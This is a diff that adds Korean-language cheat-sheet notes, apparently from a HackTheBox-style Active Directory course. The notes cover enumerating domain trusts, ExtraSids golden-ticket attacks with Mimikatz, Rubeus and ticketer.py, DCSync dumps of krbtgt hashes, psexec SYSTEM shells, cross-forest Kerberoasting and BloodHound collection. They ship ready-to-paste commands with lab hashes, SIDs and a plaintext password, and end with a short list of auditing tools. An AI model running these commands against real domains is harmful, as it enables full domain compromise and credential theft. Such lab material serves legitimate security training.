@@ -842,7 +842,191 @@ Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
 <br/><br/>
 # Domain Trusts Primer
 
-## 
+## 1. Trust Relationships 열거
+
+### Get-ADTrust 사용하여 Trust Relationships 열거
+```
+Import-Module activedirectory
+Get-ADTrust -Filter *
+```
+
+### Get-DomainTrust를 사용하여 기존 신뢰 확인
+```Get-DomainTrust```
+
+### Get-DomainTrustMapping 사용하여 신뢰 매핑
+```
+Import-Module .\PowerView.ps1
+Get-DomainTrustMapping
+```
+
+### Get-DomainUser를 사용하여 자식 도메인의 사용자 확인
+```Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName```
+
+### netdom을 사용하여 domain trust 쿼리
+```netdom query /domain:inlanefreight.local trust```
+
+### netdom을 사용하여 도메인 컨트롤러 쿼리
+```netdom query /domain:inlanefreight.local dc```
+
+### netdom을 사용하여 워크스테이션 및 서버 쿼리
+```netdom query /domain:inlanefreight.local workstation```
+
+<br/><br/>
+## 2. Attacking Domain Trusts - 자식 -> 부모 - from Windows
+
+### ExtraSids Attack - Mimikatz
+
+#### Mimikatz를 사용하여 KRBTGT 계정의 NT 해시 얻기
+```mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt```
+
+#### Get-DomainSID 사용
+```
+Import-Module .\PowerView.ps1
+Get-DomainSID
+```
+
+#### Get-DomainGroup을 사용하여 Enterprise Admins 그룹의 SID 얻기
+```Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid```
+
+#### ls를 사용하여 액세스 불가 확인
+```ls \\academy-ea-dc01.inlanefreight.local\c$```
+
+#### Mimikatz로 골든 티켓 만들기
+```
+mimikatz.exe
+mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+```
+
+#### klist를 사용하여 Kerberos 티켓이 메모리에 있는지 확인
+```klist```
+
+#### 도메인 컨트롤러의 전체 C: 드라이브 나열
+```ls \\academy-ea-dc01.inlanefreight.local\c$```
+
+### ExtraSids Attack - Rubeus
+
+#### Rubeus를 실행하기 전에 ls를 사용하여 액세스 불가 확인
+```ls \\academy-ea-dc01.inlanefreight.local\c$```
+
+#### Rubeus를 사용하여 골든 티켓 만들기
+```.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt```
+
+#### klist를 사용하여 티켓이 메모리에 있는지 확인
+```klist```
+
+#### DCSync 공격 수행
+```
+.\mimikatz.exe
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+```
+특정 도메인 대상 : ```mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL```
+
+<br/><br/>
+## 3. Attacking Domain Trusts - 자식 -> 부모 - from Linux
+
+### secretsdump.py로 DCSync 수행
+```secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt```
+
+### lookupsid.py를 사용하여 SID Brute Forcing 수행
+```lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240```
+
+### 도메인 SID 찾기
+```lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"```
+
+### 도메인 SID를 잡고 Enterprise Admin의 RID에 연결
+```lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"```
+
+### ticketer.py를 사용하여 골든 티켓 구성
+```ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker```
+
+### KRB5CCNAME 환경 변수 설정
+```export KRB5CCNAME=hacker.ccache```
+
+### Impacket의 psexec.py를 사용하여 SYSTEM shell 가져오기
+```psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5```
+
+### raiseChild.py로 공격 수행(자동화, 필요시 사용)
+```raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm```
+
+<br/><br/>
+## 4. Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+
+### Cross-Forest Kerberoasting
+
+#### Get-DomainUser를 사용하여 연관된 SPN에 대한 계정 열거
+```Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName```
+
+#### mssqlsvc 계정 열거
+```Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof```
+
+#### /domain 플래그를 사용하여 Rubeus로 Kerberoasting 공격 수행
+```.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap```
+
+### 관리자 비밀번호 재사용 및 그룹 멤버십
+
+#### Get-DomainForeignGroupMember 사용하여 도메인에 속하지 않는 사용자가 있는 그룹 열거
+```Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL```
+
+#### Enter-PSSession을 사용하여 DC03에 액세스하기
+```Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator```
+
+<br/><br/>
+## 5. Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
+
+### Cross-Forest Kerberoasting
+
+#### GetUserSPNs.py 사용
+```GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley```
+
+#### -request 플래그 사용
+```GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley```
+
+### Bloodhound-python으로 Foreign Group Membership 헌팅
+
+#### /etc/resolv.conf에 INLANEFREIGHT.LOCAL 정보 추가
+```
+cat /etc/resolv.conf
+
+domain INLANEFREIGHT.LOCAL
+nameserver 172.16.5.5
+```
+
+#### INLANEFREIGHT.LOCAL에 대한 bloodhound-python 실행
+```bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2```
+
+#### zip -r로 파일 압축
+```zip -r ilfreight_bh.zip *.json```
+
+#### /etc/resolv.conf에 FREIGHTLOGISTICS.LOCAL 정보 추가
+```
+cat /etc/resolv.conf
+
+domain FREIGHTLOGISTICS.LOCAL
+nameserver 172.16.5.238
+```
+
+#### FREIGHTLOGISTICS.LOCAL에 대해 bloodhound-python 실행
+```bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2```
+
+<br/><br/>
+# AD Auditing Techniques
+
+## 1. Active Directory Explorer를 사용하여 AD 스냅샷 만들기
+[AD Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) : ```File --> Create Snapshot```
+
+## 2. PingCastle
+[PingCastle](https://www.pingcastle.com/documentation/) : ```실행 후 PingCastle Interactive TUI 옵션 선택```
+
+## 3. Group3r
+[Group3r](https://github.com/Group3r/Group3r) : ```group3r.exe -f <filepath-name.log>```
+
+## 4. ADRecon
+[ADRecon](https://github.com/adrecon/ADRecon) : ```.\ADRecon.ps1```
+
+
+
+
+
 
 
 
